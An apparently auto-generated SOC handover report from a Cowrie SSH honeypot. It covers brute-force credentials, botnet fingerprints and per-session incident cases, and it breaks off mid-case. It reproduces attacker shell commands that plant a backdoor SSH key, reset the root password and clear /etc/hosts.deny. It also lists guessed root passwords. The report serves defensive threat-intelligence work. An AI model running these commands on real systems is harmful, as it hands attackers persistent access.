# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-26 |
| **Generated At** | 2026-05-26T07:55:27Z |
| **Shift Time** | 07:55 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **469** |
| Confirmed Threats | **421** |
| False Positives Filtered | **48** (10.2%) |
| Unique Attacker IPs | **40** |
| Countries of Origin | **18** |
| High Severity Cases | **154** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **315** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **329** |
| Unique Credential Pairs | **123** |
| Unique Usernames | **58** |
| Unique Passwords | **116** |
| Successful Auth Pairs | **97** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 154 |
| `345gs5662d34` | 75 |
| `ubuntu` | 16 |
| `cloud` | 9 |
| `curl` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 76 |
| `345gs5662d34` | 75 |
| `fjbdfdjkdsfs541544AA@@` | 19 |
| `fjbdfdjkdsfs541544@@` | 10 |
| `Wangsu@2017` | 9 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 76 |
| `345gs5662d34` | `345gs5662d34` | 75 |
| `root` | `fjbdfdjkdsfs541544AA@@` | 10 |
| `root` | `fjbdfdjkdsfs541544@@` | 10 |
| `cloud` | `Wangsu@2017` | 9 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `fjbdfdjkdsfs541544AA@@` | `101.96.220.35` | 2026-05-26T04:00:07 |
| `root` | `3245gs5662d34` | `101.96.220.35` | 2026-05-26T04:00:12 |
| `root` | `Abcd*1234` | `101.96.220.35` | 2026-05-26T04:02:39 |
| `root` | `Dc123456` | `101.96.220.35` | 2026-05-26T04:04:38 |
| `root` | `Zaq12wsx!` | `101.96.220.35` | 2026-05-26T04:05:35 |
| `root` | `!QA2ws3ed` | `183.91.186.36` | 2026-05-26T04:38:42 |
| `root` | `3245gs5662d34` | `183.91.186.36` | 2026-05-26T04:38:45 |
| `root` | `gj123456` | `180.76.184.79` | 2026-05-26T04:42:54 |
| `root` | `3245gs5662d34` | `180.76.184.79` | 2026-05-26T04:43:19 |
| `root` | `123@Root` | `113.141.171.139` | 2026-05-26T04:46:43 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `183.91.186.36` | 2026-05-26T04:46:45 |
| `root` | `3245gs5662d34` | `113.141.171.139` | 2026-05-26T04:46:47 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `113.141.171.139` | 2026-05-26T04:47:28 |
| `root` | `Qazwsx@123` | `183.91.186.36` | 2026-05-26T04:48:14 |
| `root` | `adminlinux` | `113.141.171.139` | 2026-05-26T04:49:05 |
| `root` | `aA123456789` | `113.141.171.139` | 2026-05-26T04:49:52 |
| `root` | `1qazxsw2@` | `113.141.171.139` | 2026-05-26T04:50:14 |
| `root` | `aA@12345` | `113.141.171.139` | 2026-05-26T04:50:36 |
| `root` | `Password123!` | `183.91.186.36` | 2026-05-26T04:50:38 |
| `root` | `fjbdfdjkdsfs541544@@` | `113.141.171.139` | 2026-05-26T04:51:22 |
| `root` | `As123456.` | `113.141.171.139` | 2026-05-26T04:51:47 |
| `root` | `1234rewq!` | `113.141.171.139` | 2026-05-26T04:52:35 |
| `root` | `fjbdfdjkdsfs541544@@` | `183.91.186.36` | 2026-05-26T04:52:52 |
| `root` | `root123456` | `101.47.155.9` | 2026-05-26T05:09:52 |
| `root` | `3245gs5662d34` | `101.47.155.9` | 2026-05-26T05:09:54 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `180.76.243.197` | 2026-05-26T05:17:40 |
| `root` | `3245gs5662d34` | `180.76.243.197` | 2026-05-26T05:17:59 |
| `root` | `fjbdfdjkdsfs541544@@` | `14.103.76.234` | 2026-05-26T05:22:13 |
| `root` | `3245gs5662d34` | `14.103.76.234` | 2026-05-26T05:22:17 |
| `root` | `fjbdfdjkdsfs541544@@` | `186.10.86.130` | 2026-05-26T05:48:58 |
| `root` | `3245gs5662d34` | `186.10.86.130` | 2026-05-26T05:49:06 |
| `root` | `qwer1234` | `101.126.23.159` | 2026-05-26T05:58:23 |
| `root` | `3245gs5662d34` | `101.126.23.159` | 2026-05-26T05:58:35 |
| `root` | `qazxsw123` | `101.126.23.159` | 2026-05-26T06:05:37 |
| `root` | `Aa12345678!` | `101.126.23.159` | 2026-05-26T06:07:04 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `101.126.23.159` | 2026-05-26T06:11:12 |
| `root` | `123456ABC` | `118.196.30.45` | 2026-05-26T06:20:54 |
| `root` | `3245gs5662d34` | `118.196.30.45` | 2026-05-26T06:20:58 |
| `root` | `India@2025` | `101.126.23.159` | 2026-05-26T06:21:43 |
| `root` | `#EDC4rfv5tgb` | `118.145.102.69` | 2026-05-26T06:22:56 |
| `root` | `3245gs5662d34` | `118.145.102.69` | 2026-05-26T06:23:00 |
| `root` | `fjbdfdjkdsfs541544@@` | `101.126.23.159` | 2026-05-26T06:24:23 |
| `root` | `Cn123456` | `101.126.23.159` | 2026-05-26T06:27:14 |
| `root` | `12wertyui` | `120.48.147.81` | 2026-05-26T06:28:24 |
| `root` | `3245gs5662d34` | `120.48.147.81` | 2026-05-26T06:28:38 |
| `root` | `admin@123.com` | `117.83.83.235` | 2026-05-26T06:34:43 |
| `root` | `3245gs5662d34` | `117.83.83.235` | 2026-05-26T06:34:51 |
| `root` | `P@ssw0rd.com` | `101.32.240.31` | 2026-05-26T06:44:28 |
| `root` | `3245gs5662d34` | `101.32.240.31` | 2026-05-26T06:44:30 |
| `root` | `!@#456qwe` | `101.32.240.31` | 2026-05-26T06:45:21 |
| `root` | `fjbdfdjkdsfs541544@@` | `102.88.137.145` | 2026-05-26T06:47:07 |
| `root` | `3245gs5662d34` | `102.88.137.145` | 2026-05-26T06:47:14 |
| `root` | `Admin#2025` | `102.88.137.145` | 2026-05-26T06:48:00 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `101.32.240.31` | 2026-05-26T06:48:36 |
| `root` | `123456@A` | `102.88.137.145` | 2026-05-26T06:48:52 |
| `root` | `123456@A` | `101.32.240.31` | 2026-05-26T06:50:18 |
| `root` | `!@#456qwe` | `102.88.137.145` | 2026-05-26T06:51:04 |
| `root` | `fjbdfdjkdsfs541544@@` | `101.32.240.31` | 2026-05-26T06:51:11 |
| `root` | `Admin#2025` | `101.32.240.31` | 2026-05-26T06:52:57 |
| `root` | `1q2w3e!@#` | `102.88.137.145` | 2026-05-26T06:53:51 |
| `root` | `P@ssw0rd.com` | `102.88.137.145` | 2026-05-26T06:54:47 |
| `root` | `1q2w3e!@#` | `101.32.240.31` | 2026-05-26T06:57:45 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `102.88.137.145` | 2026-05-26T07:03:13 |
| `root` | `Password2025` | `183.250.89.44` | 2026-05-26T07:17:46 |
| `root` | `3245gs5662d34` | `183.250.89.44` | 2026-05-26T07:17:51 |
| `root` | `a1a2a3a4` | `183.250.89.44` | 2026-05-26T07:18:35 |
| `root` | `2005` | `183.250.89.44` | 2026-05-26T07:19:02 |
| `root` | `fjbdfdjkdsfs541544@@` | `183.250.89.44` | 2026-05-26T07:20:28 |
| `root` | `112358` | `183.250.89.44` | 2026-05-26T07:21:33 |
| `root` | `redhat01` | `183.250.89.44` | 2026-05-26T07:21:54 |
| `root` | `hasan123` | `183.250.89.44` | 2026-05-26T07:22:19 |
| `root` | `qwerty!1` | `183.250.89.44` | 2026-05-26T07:22:41 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `183.250.89.44` | 2026-05-26T07:23:03 |
| `root` | `Admin2025` | `183.250.89.44` | 2026-05-26T07:23:25 |
| `root` | `London123` | `183.250.89.44` | 2026-05-26T07:23:47 |
| `root` | `Password123` | `183.250.89.44` | 2026-05-26T07:24:29 |
| `root` | `123456!@` | `120.48.134.186` | 2026-05-26T07:26:50 |
| `root` | `3245gs5662d34` | `120.48.134.186` | 2026-05-26T07:27:22 |
| `root` | `ly123456!` | `197.248.8.33` | 2026-05-26T07:33:09 |
| `root` | `3245gs5662d34` | `197.248.8.33` | 2026-05-26T07:33:14 |
| `root` | `p0o9i8u7` | `112.119.21.245` | 2026-05-26T07:33:21 |
| `root` | `3245gs5662d34` | `112.119.21.245` | 2026-05-26T07:33:25 |
| `root` | `Ubuntu2022` | `197.248.8.33` | 2026-05-26T07:34:01 |
| `root` | `ABCabc` | `112.119.21.245` | 2026-05-26T07:34:11 |
| `root` | `fjbdfdjkdsfs541544@@` | `112.119.21.245` | 2026-05-26T07:34:57 |
| `root` | `Dsa12345` | `197.248.8.33` | 2026-05-26T07:35:13 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `112.119.21.245` | 2026-05-26T07:35:44 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `197.248.8.33` | 2026-05-26T07:36:27 |
| `root` | `server` | `112.119.21.245` | 2026-05-26T07:36:34 |
| `root` | `Admin123!@#` | `112.119.21.245` | 2026-05-26T07:37:21 |
| `root` | `qwerty12` | `197.248.8.33` | 2026-05-26T07:38:10 |
| `root` | `qaz123wsx` | `112.119.21.245` | 2026-05-26T07:38:51 |
| `root` | `Js123456` | `197.248.8.33` | 2026-05-26T07:39:00 |
| `root` | `bangsat` | `197.248.8.33` | 2026-05-26T07:39:25 |
| `root` | `fjbdfdjkdsfs541544@@` | `197.248.8.33` | 2026-05-26T07:39:49 |
| `root` | `Ll123456789` | `112.119.21.245` | 2026-05-26T07:40:20 |
| `root` | `nE7jANo` | `112.119.21.245` | 2026-05-26T07:42:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **469** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 338 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 163 | 9 |
| `f555226df196...` | Mirai/variant | 162 | 8 |
| `af8223ac9914...` | libssh-based | 9 | 4 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 163 | 9 | Modern SSH client |
| `f555226df196...` | libssh | 162 | 8 | Mirai/variant |
| `af8223ac9914...` | libssh | 9 | 4 | libssh-based |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 74 | 18 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:A9pShiHSFvgt"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.23.159`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.126.23.159`, `112.119.21.245`, `197.248.8.33`, `118.145.102.69`, `180.76.243.197`, `186.10.86.130`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **40** |
| Unique ASNs | **27** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | LOW |
| `AS200702` | Kazakov Viktor Aleksandrovich | 1 | LOW |
| `AS27651` | ENTEL CHILE S.A. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (154)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-92b4efc4d6db

| Field | Detail |
|---|---|
| **Source IP** | `101.96.220[.]35` |
| **First Seen** | 2026-05-26 04:00 |
| **Last Seen** | 2026-05-26 04:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:00:07` | `cowrie.session.connect` |
| `2026-05-26 04:00:07` | `cowrie.client.version` |
| `2026-05-26 04:00:07` | `cowrie.client.kex` |
| `2026-05-26 04:00:07` | `cowrie.login.success` |
| `2026-05-26 04:00:08` | `cowrie.session.params` |
| `2026-05-26 04:00:08` | `cowrie.command.input` |
| `2026-05-26 04:00:08` | `cowrie.command.failed` |
| `2026-05-26 04:00:09` | `cowrie.log.closed` |
| `2026-05-26 04:00:09` | `cowrie.session.params` |
| `2026-05-26 04:00:09` | `cowrie.command.input` |
| `2026-05-26 04:00:09` | `cowrie.session.file_download` |
| `2026-05-26 04:00:09` | `cowrie.log.closed` |
| `2026-05-26 04:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.220[.]35` to AbuseIPDB if not already reported
- [ ] Block `101.96.220[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0ae299cc108

| Field | Detail |
|---|---|
| **Source IP** | `101.96.220[.]35` |
| **First Seen** | 2026-05-26 04:00 |
| **Last Seen** | 2026-05-26 04:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:00:11` | `cowrie.session.connect` |
| `2026-05-26 04:00:11` | `cowrie.client.version` |
| `2026-05-26 04:00:11` | `cowrie.client.kex` |
| `2026-05-26 04:00:12` | `cowrie.login.success` |
| `2026-05-26 04:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.220[.]35` to AbuseIPDB if not already reported
- [ ] Block `101.96.220[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41111b667a43

| Field | Detail |
|---|---|
| **Source IP** | `101.96.220[.]35` |
| **First Seen** | 2026-05-26 04:02 |
| **Last Seen** | 2026-05-26 04:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:02:39` | `cowrie.session.connect` |
| `2026-05-26 04:02:39` | `cowrie.client.version` |
| `2026-05-26 04:02:39` | `cowrie.client.kex` |
| `2026-05-26 04:02:39` | `cowrie.login.success` |
| `2026-05-26 04:02:40` | `cowrie.session.params` |
| `2026-05-26 04:02:40` | `cowrie.command.input` |
| `2026-05-26 04:02:40` | `cowrie.command.failed` |
| `2026-05-26 04:02:40` | `cowrie.log.closed` |
| `2026-05-26 04:02:40` | `cowrie.session.params` |
| `2026-05-26 04:02:40` | `cowrie.command.input` |
| `2026-05-26 04:02:41` | `cowrie.session.file_download` |
| `2026-05-26 04:02:41` | `cowrie.log.closed` |
| `2026-05-26 04:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.220[.]35` to AbuseIPDB if not already reported
- [ ] Block `101.96.220[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d76093aa8ba

| Field | Detail |
|---|---|
| **Source IP** | `101.96.220[.]35` |
| **First Seen** | 2026-05-26 04:02 |
| **Last Seen** | 2026-05-26 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:02:43` | `cowrie.session.connect` |
| `2026-05-26 04:02:43` | `cowrie.client.version` |
| `2026-05-26 04:02:44` | `cowrie.client.kex` |
| `2026-05-26 04:02:44` | `cowrie.login.success` |
| `2026-05-26 04:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.220[.]35` to AbuseIPDB if not already reported
- [ ] Block `101.96.220[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b507d4ca064

| Field | Detail |
|---|---|
| **Source IP** | `101.96.220[.]35` |
| **First Seen** | 2026-05-26 04:04 |
| **Last Seen** | 2026-05-26 04:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:04:37` | `cowrie.session.connect` |
| `2026-05-26 04:04:37` | `cowrie.client.version` |
| `2026-05-26 04:04:37` | `cowrie.client.kex` |
| `2026-05-26 04:04:38` | `cowrie.login.success` |
| `2026-05-26 04:04:39` | `cowrie.session.params` |
| `2026-05-26 04:04:39` | `cowrie.command.input` |
| `2026-05-26 04:04:39` | `cowrie.command.failed` |
| `2026-05-26 04:04:39` | `cowrie.log.closed` |
| `2026-05-26 04:04:39` | `cowrie.session.params` |
| `2026-05-26 04:04:39` | `cowrie.command.input` |
| `2026-05-26 04:04:39` | `cowrie.session.file_download` |
| `2026-05-26 04:04:39` | `cowrie.log.closed` |
| `2026-05-26 04:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.220[.]35` to AbuseIPDB if not already reported
- [ ] Block `101.96.220[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67d0b7e5df96

| Field | Detail |
|---|---|
| **Source IP** | `101.96.220[.]35` |
| **First Seen** | 2026-05-26 04:04 |
| **Last Seen** | 2026-05-26 04:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:04:41` | `cowrie.session.connect` |
| `2026-05-26 04:04:41` | `cowrie.client.version` |
| `2026-05-26 04:04:41` | `cowrie.client.kex` |
| `2026-05-26 04:04:42` | `cowrie.login.success` |
| `2026-05-26 04:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.220[.]35` to AbuseIPDB if not already reported
- [ ] Block `101.96.220[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c070852b76e6

| Field | Detail |
|---|---|
| **Source IP** | `101.96.220[.]35` |
| **First Seen** | 2026-05-26 04:05 |
| **Last Seen** | 2026-05-26 04:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:05:34` | `cowrie.session.connect` |
| `2026-05-26 04:05:34` | `cowrie.client.version` |
| `2026-05-26 04:05:34` | `cowrie.client.kex` |
| `2026-05-26 04:05:35` | `cowrie.login.success` |
| `2026-05-26 04:05:35` | `cowrie.session.params` |
| `2026-05-26 04:05:35` | `cowrie.command.input` |
| `2026-05-26 04:05:35` | `cowrie.command.failed` |
| `2026-05-26 04:05:35` | `cowrie.log.closed` |
| `2026-05-26 04:05:35` | `cowrie.session.params` |
| `2026-05-26 04:05:35` | `cowrie.command.input` |
| `2026-05-26 04:05:35` | `cowrie.session.file_download` |
| `2026-05-26 04:05:35` | `cowrie.log.closed` |
| `2026-05-26 04:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.220[.]35` to AbuseIPDB if not already reported
- [ ] Block `101.96.220[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf3a2f1a5b9

| Field | Detail |
|---|---|
| **Source IP** | `101.96.220[.]35` |
| **First Seen** | 2026-05-26 04:05 |
| **Last Seen** | 2026-05-26 04:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:05:37` | `cowrie.session.connect` |
| `2026-05-26 04:05:37` | `cowrie.client.version` |
| `2026-05-26 04:05:37` | `cowrie.client.kex` |
| `2026-05-26 04:05:38` | `cowrie.login.success` |
| `2026-05-26 04:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.220[.]35` to AbuseIPDB if not already reported
- [ ] Block `101.96.220[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-532ab5a32710

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 04:38 |
| **Last Seen** | 2026-05-26 04:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
